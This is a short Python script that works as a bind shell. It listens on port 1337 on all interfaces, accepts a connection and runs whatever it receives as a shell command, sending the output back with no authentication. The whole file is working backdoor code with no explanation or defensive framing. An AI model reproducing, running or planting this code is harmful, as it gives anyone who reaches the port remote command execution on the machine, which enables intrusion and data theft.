import socket
import subprocess

host = ''
port = 1337
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((host, port))
s.listen(3)
connenction, addr = s.accept()
while True:
    data = str(connenction.recv(1024), "utf8")
    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr = subprocess.PIPE)
    stdout = str(proc.stdout.read(), "utf8")
    connenction.send(bytes(stdout, "utf8"))
    stdout = str(proc.stderr.read(), "utf8")
    connenction.send(bytes(stdout, "utf8"))